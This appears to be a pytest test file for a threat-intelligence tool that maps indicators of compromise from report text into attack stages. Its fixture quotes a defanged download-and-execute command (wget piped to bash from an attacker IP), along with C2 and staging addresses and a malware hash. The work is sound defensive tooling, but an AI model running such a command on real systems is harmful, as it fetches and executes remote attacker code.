"""IOC flow: stages from the report's own words, links from indicators mentioned together."""

import pytest

from shikari.build import ioc_flow
from shikari.build.ioc_flow import build_ioc_flow, ioc_mentions
from shikari.build.ioc_sweep import clean_report_iocs

TEXT = (
    "The attacker ran wget -qO- hxxp://172.233.228[.]93/patch|bash which dropped UPSTYLE "
    "(3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac).\n"
    "The backdoor beaconed to the C2 server at nhdata.s3-us-west-2.amazonaws[.]com.\n"
    "Exploitation attempts came from 110.47.250[.]103."
)
IOCS = {"ip": ["172.233.228[.]93", "110.47.250[.]103", "45.121.51[.]2"],
        "hash": ["3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac"],
        "domain": ["nhdata.s3-us-west-2.amazonaws[.]com"]}


def _flow():
    return build_ioc_flow(clean_report_iocs(IOCS), ioc_mentions(TEXT, IOCS), "test report")


def _stage_of(flow, value):
    return next(s["key"] for s in flow["stages"] for n in s["nodes"] if n["value"] == value)


@pytest.mark.unit
def test_stages_come_from_the_sentence_around_each_ioc():
    flow = _flow()
    assert _stage_of(flow, "110.47.250.103") == "exploitation"
    assert _stage_of(flow, "172.233.228.93") == "staging"
    assert _stage_of(flow, "3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac") == "payload"
    assert _stage_of(flow, "nhdata.s3-us-west-2.amazonaws.com") == "c2"
    # Listed without context: placed by type, not guessed into a stage
    assert _stage_of(flow, "45.121.51.2") == "infrastructure"
    assert [s["key"] for s in flow["stages"]] == ["exploitation", "staging", "payload", "c2", "infrastructure"]


@pytest.mark.unit
def test_iocs_in_one_command_are_linked_earlier_stage_to_later():
    flow = _flow()
    ids = {n["value"]: n["id"] for s in flow["stages"] for n in s["nodes"]}
    assert [(e["from"], e["to"]) for e in flow["edges"]] == [
        (ids["172.233.228.93"], ids["3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac"])]
    assert "wget" in flow["edges"][0]["evidence"]


@pytest.mark.unit
def test_no_iocs_no_flow(tmp_path, monkeypatch):
    monkeypatch.setattr(ioc_flow, "IOC_FLOWS_DIR", str(tmp_path))
    assert build_ioc_flow({}, {}) == {}
    ioc_flow.save_ioc_flow("APT1", {})
    assert ioc_flow.load_ioc_flow("APT1") == {}
    ioc_flow.save_ioc_flow("CVE-2024-3400", _flow())
    assert ioc_flow.load_ioc_flow("CVE-2024-3400")["stats"]["iocs"] == 5


@pytest.mark.unit
def test_stage_follows_most_of_the_evidence():
    text = ("For two of these attempts, UPSTYLE was hosted at hxxp://144.172.79[.]92/update.py.\n"
            "The threat actor last modified UPSTYLE hosted at 144.172.79[.]92 on April 7.\n"
            "The update.py file hosted at 144.172.79[.]92 has a SHA256 value of abc.")
    iocs = {"ip": ["144.172.79[.]92"]}
    flow = build_ioc_flow(clean_report_iocs(iocs), ioc_mentions(text, iocs))
    assert flow["stages"][0]["key"] == "staging"
